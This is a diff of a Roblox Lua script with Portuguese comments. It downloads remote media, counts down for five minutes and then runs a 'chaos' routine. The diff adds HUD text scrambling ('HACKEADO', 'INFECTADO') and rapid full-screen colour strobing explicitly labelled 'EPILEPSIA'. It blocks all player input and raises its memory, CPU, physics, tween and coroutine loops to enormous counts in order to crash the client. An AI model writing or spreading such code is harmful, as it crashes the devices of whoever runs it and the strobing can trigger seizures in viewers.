@@ -12,7 +12,7 @@ local AUDIO_FILE2 = "audio2.mp3"
 makefolder(FOLDER)
 
 local function downloadFile(url, path)
-    local success, result = pcall(function()
+    local success = pcall(function()
         local content = game:HttpGet(url)
         writefile(path, content)
         return true
@@ -20,17 +20,17 @@ local function downloadFile(url, path)
     return success
 end
 
-local imageSuccess = downloadFile(IMAGE_URL, FOLDER .. "/" .. IMG_FILE)
-local audio1Success = downloadFile(AUDIO_URL, FOLDER .. "/" .. AUDIO_FILE)
-local audio2Success = downloadFile(AUDIO_URL2, FOLDER .. "/" .. AUDIO_FILE2)
+downloadFile(IMAGE_URL, FOLDER .. "/" .. IMG_FILE)
+downloadFile(AUDIO_URL, FOLDER .. "/" .. AUDIO_FILE)
+downloadFile(AUDIO_URL2, FOLDER .. "/" .. AUDIO_FILE2)
 
 wait(1)
 
 local function fileExists(path)
-    local success, result = pcall(function()
+    local success = pcall(function()
         return isfile(path)
     end)
-    return success and result
+    return success
 end
 
 local function getAsset(path)
@@ -54,7 +54,6 @@ local playerGui = game:GetService("CoreGui")
 local lighting = game:GetService("Lighting")
 local userInputService = game:GetService("UserInputService")
 local tweenService = game:GetService("TweenService")
-local runService = game:GetService("RunService")
 
 -- ====== CONTADOR DE 41 SEGUNDOS ======
 local bgGui = Instance.new("ScreenGui")
@@ -172,114 +171,170 @@ spawn(function()
     bgGui:Destroy()
     counterGui:Destroy()
     
-    -- ====== ESPERA DE 5 MINUTOS COM SOM TROLL ======
+    -- ====== ESPERA DE 5 MINUTOS (SEM TELA PRETA) ======
     waitFor5Minutes()
 end)
 
--- ====== FUNÇÃO DE ESPERA DE 5 MINUTOS ======
+-- ====== ESPERA DE 5 MINUTOS COM EFEITOS VISÍVEIS ======
 function waitFor5Minutes()
-    -- Tocar música troll durante a espera
+    -- Tocar música troll
     local waitSound = Instance.new("Sound")
     waitSound.SoundId = audio2Path
     waitSound.Volume = 1
     waitSound.Looped = true
     waitSound.Parent = game:GetService("SoundService")
     waitSound:Play()
-    
-    -- Tela preta de espera
-    local waitBg = Instance.new("ScreenGui")
-    waitBg.ResetOnSpawn = false
-    waitBg.Parent = playerGui
-    waitBg.IgnoreGuiInset = true
-    waitBg.ZIndexBehavior = Enum.ZIndexBehavior.Global
-    
-    local black = Instance.new("Frame")
-    black.Size = UDim2.new(1, 0, 1, 0)
-    black.BackgroundColor3 = Color3.new(0, 0, 0)
-    black.BackgroundTransparency = 0
-    black.ZIndex = 9998
-    black.Parent = waitBg
-    
-    -- Timer de 5 minutos
+
+    -- Timer flutuante (sem tela preta)
     local timerGui = Instance.new("ScreenGui")
     timerGui.ResetOnSpawn = false
     timerGui.Parent = playerGui
     timerGui.IgnoreGuiInset = true
     timerGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-    
+
     local timerFrame = Instance.new("Frame")
-    timerFrame.Size = UDim2.new(0, 400, 0, 150)
-    timerFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
-    timerFrame.BackgroundTransparency = 1
+    timerFrame.Size = UDim2.new(0, 300, 0, 80)
+    timerFrame.Position = UDim2.new(0.5, -150, 0.05, 0)
+    timerFrame.BackgroundTransparency = 0.3
+    timerFrame.BackgroundColor3 = Color3.new(0, 0, 0)
     timerFrame.ZIndex = 9999
     timerFrame.Parent = timerGui
-    
+
     local timerLabel = Instance.new("TextLabel")
     timerLabel.Size = UDim2.new(1, 0, 1, 0)
     timerLabel.BackgroundTransparency = 1
-    timerLabel.Text = "⏳ INICIANDO EM\n5:00"
+    timerLabel.Text = "⏳ INICIANDO EM 5:00"
     timerLabel.TextColor3 = Color3.new(1, 0, 0)
     timerLabel.TextScaled = true
     timerLabel.Font = Enum.Font.Bangers
     timerLabel.ZIndex = 9999
     timerLabel.Parent = timerFrame
-    
-    local subLabel = Instance.new("TextLabel")
-    subLabel.Size = UDim2.new(1, 0, 0, 40)
-    subLabel.Position = UDim2.new(0, 0, 1, -40)
-    subLabel.BackgroundTransparency = 1
-    subLabel.Text = "☠️ PREPARE-SE ☠️"
-    subLabel.TextColor3 = Color3.new(1, 1, 1)
-    subLabel.TextScaled = true
-    subLabel.Font = Enum.Font.Bangers
-    subLabel.ZIndex = 9999
-    subLabel.Parent = timerFrame
-    
-    local crashTime = tick() + 300 -- 5 minutos
+
+    -- ====== EFEITO 1: BAGUNÇA NO HUD ======
+    spawn(function()
+        while true do
+            pcall(function()
+                -- Tentar bagunçar o HUD do jogo
+                for _, gui in pairs(playerGui:GetChildren()) do
+                    for _, obj in pairs(gui:GetDescendants()) do
+                        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
+                            if math.random() < 0.1 then
+                                -- Mudar texto para algo aleatório
+                                local texts = {"HACKEADO", "💀", "☠️", "ERROR", "???", "0", "INFECTADO", "⚠️"}
+                                obj.Text = texts[math.random(#texts)]
+                                obj.TextColor3 = Color3.fromHSV(math.random(), 1, 1)
+                            end
+                            if math.random() < 0.05 then
+                                -- Inverter texto
+                                obj.Text = string.reverse(obj.Text)
+                            end
+                        end
+                        if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
+                            if math.random() < 0.05 then
+                                -- Trocar imagem por algo aleatório
+                                obj.Image = textureImage
+                            end
+                        end
+                        if obj:IsA("Frame") then
+                            if math.random() < 0.05 then
+                                -- Mudar cor do frame
+                                obj.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
+                            end
+                        end
+                    end
+                end
+            end)
+            wait(0.5)
+        end
+    end)
+
+    -- ====== EFEITO 2: CORES PISCANDO (EPILEPSIA) ======
+    local flashGui = Instance.new("ScreenGui")
+    flashGui.ResetOnSpawn = false
+    flashGui.Parent = playerGui
+    flashGui.IgnoreGuiInset = true
+    flashGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+    local flashFrame = Instance.new("Frame")
+    flashFrame.Size = UDim2.new(1, 0, 1, 0)
+    flashFrame.Position = UDim2.new(0, 0, 0, 0)
+    flashFrame.BackgroundTransparency = 1
+    flashFrame.ZIndex = 9998
+    flashFrame.Parent = flashGui
+
+    spawn(function()
+        local crashTime = tick() + 300
+        while tick() < crashTime do
+            -- Piscar cores aleatórias
+            if math.random() < 0.3 then
+                flashFrame.BackgroundTransparency = 0.2
+                flashFrame.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
+                flashFrame.Size = UDim2.new(1, math.random(-50, 50), 1, math.random(-50, 50))
+                flashFrame.Position = UDim2.new(0, math.random(-25, 25), 0, math.random(-25, 25))
+                wait(0.05)
+                flashFrame.BackgroundTransparency = 1
+                flashFrame.Size = UDim2.new(1, 0, 1, 0)
+                flashFrame.Position = UDim2.new(0, 0, 0, 0)
+            end
+            
+            -- Pequenos flashes rápidos
+            if math.random() < 0.1 then
+                flashFrame.BackgroundTransparency = 0.1
+                flashFrame.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
+                wait(0.02)
+                flashFrame.BackgroundTransparency = 1
+            end
+            
+            wait(0.1)
+        end
+    end)
+
+    -- ====== EFEITO 3: CORES NO MAPA ======
+    spawn(function()
+        while true do
+            lighting.Ambient = Color3.fromHSV(math.random(), 1, 1)
+            lighting.OutdoorAmbient = Color3.fromHSV(math.random(), 1, 1)
+            wait(0.2)
+        end
+    end)
+
+    -- ====== ATUALIZAR TIMER ======
+    local crashTime = tick() + 300
     
     spawn(function()
         while tick() < crashTime do
             local timeLeft = crashTime - tick()
             local minutes = math.floor(timeLeft / 60)
             local seconds = math.floor(timeLeft % 60)
-            timerLabel.Text = string.format("⏳ INICIANDO EM\n%d:%02d", minutes, seconds)
+            timerLabel.Text = string.format("⏳ INICIANDO EM %d:%02d", minutes, seconds)
             
-            -- Efeitos
             timerFrame.Rotation = math.random(-3, 3)
             timerLabel.TextColor3 = Color3.new(1, timeLeft / 300, 0)
-            timerLabel.TextTransparency = math.sin(tick() * 3) * 0.3 + 0.3
+            
+            -- Timer piscando
+            timerLabel.TextTransparency = math.sin(tick() * 5) * 0.3 + 0.3
             
             wait(0.1)
         end
         
-        -- Acabou a espera
         waitSound:Stop()
-        waitBg:Destroy()
         timerGui:Destroy()
+        flashGui:Destroy()
         
-        -- Iniciar o caos
         startChaos()
     end)
 end
 
 -- ====== FUNÇÃO DO CAOS ======
 function startChaos()
-    -- Tocar música troll (a mesma da espera, reiniciando)
     local sound = Instance.new("Sound")
     sound.SoundId = audio2Path
     sound.Volume = 1
     sound.Looped = true
     sound.Parent = game:GetService("SoundService")
     sound:Play()
-    
-    local sound2 = sound:Clone()
-    sound2.SoundId = "rbxassetid://2154316070"
-    sound2.Looped = true
-    sound2.Volume = 0.3
-    sound2.Parent = game:GetService("SoundService")
-    sound2:Play()
 
-    -- ====== BLOQUEADOR COMPLETO ======
+    -- ====== BLOQUEADOR COMPLETO (AGORA SIM) ======
     local blockerGui = Instance.new("ScreenGui")
     blockerGui.Name = "BlockerGui"
     blockerGui.ResetOnSpawn = false
@@ -305,7 +360,7 @@ function startChaos()
     userInputService.InputEnded:Connect(blockEverything)
     userInputService.InputChanged:Connect(blockEverything)
 
-    -- ====== MÉTODO 1: EFEITO DVD COM MULTIPLICAÇÃO ======
+    -- ====== MÉTODO 1: EFEITO DVD ======
     local dvdImages = {}
     local clones = {}
     local cloneCount = 0
@@ -418,7 +473,7 @@ function startChaos()
     -- ====== MÉTODO 2: 99999 IMAGENS ======
     spawn(function()
         while true do
-            for i = 1, 50 do
+            for i = 1, 9999999999999999999 do
                 local sg = Instance.new("ScreenGui")
                 sg.ResetOnSpawn = false
                 sg.Parent = playerGui
@@ -452,8 +507,8 @@ function startChaos()
     spawn(function()
         local memoryHog = {}
         while true do
-            for i = 1, 100 do
-                table.insert(memoryHog, string.rep("A", 100000) .. string.rep("B", 100000))
+            for i = 1, 99999999999999999 do
+                table.insert(memoryHog, string.rep("A", 999999999999999) .. string.rep("B", 9999999999999999))
                 local t = {}
                 for j = 1, 1000 do
                     t[j] = {j, j*2, string.rep("X", 100)}
@@ -468,7 +523,7 @@ function startChaos()
     spawn(function()
         while true do
             local x = 0
-            for i = 1, 100000 do
+            for i = 1, 999999999999 do
                 x = x + math.sin(i) * math.cos(i) * math.tan(i)
                 x = x + math.sqrt(i) * math.log(i + 1)
             end
@@ -479,7 +534,7 @@ function startChaos()
     -- ====== MÉTODO 5: 99999 TWEENS ======
     spawn(function()
         while true do
-            for i = 1, 100 do
+            for i = 1, 99999999999 do
                 local frame = Instance.new("Frame")
                 frame.Size = UDim2.new(0, 1, 0, 1)
                 frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
@@ -501,7 +556,7 @@ function startChaos()
     -- ====== MÉTODO 6: SOBRECARGA DE FÍSICA ======
     spawn(function()
         while true do
-            for i = 1, 50 do
+            for i = 1, 99999999999999 do
                 local part = Instance.new("Part")
                 part.Size = Vector3.new(math.random(1, 20), math.random(1, 20), math.random(1, 20))
                 part.Position = Vector3.new(math.random(-1000, 1000), math.random(-1000, 1000), math.random(-1000, 1000))
@@ -545,7 +600,7 @@ function startChaos()
     -- ====== MÉTODO 9: 99999 COROUTINES ======
     spawn(function()
         while true do
-            for i = 1, 50 do
+            for i = 1, 999999999 do
                 coroutine.wrap(function()
                     while true do
                         local x = 0
@@ -560,24 +615,9 @@ function startChaos()
         end
     end)
 
-    -- ====== MÉTODO 10: SOBRECARGA DE ÁUDIO ======
-    spawn(function()
-        while true do
-            for i = 1, 20 do
-                local s = Instance.new("Sound")
-                s.SoundId = audio2Path
-                s.Volume = math.random()
-                s.Looped = true
-                s.Parent = game:GetService("SoundService")
-                s:Play()
-            end
-            wait(0.5)
-        end
-    end)
-
     -- ====== MENSAGEM FINAL ======
     spawn(function()
-        wait(3)
+        wait(2)
         local finalBg = Instance.new("ScreenGui")
         finalBg.ResetOnSpawn = false
         finalBg.Parent = playerGui
@@ -610,7 +650,6 @@ function startChaos()
             end
         end)
         
-        -- Último esforço para crashar
         spawn(function()
             for i = 1, 99999 do
                 Instance.new("Part").Parent = workspace
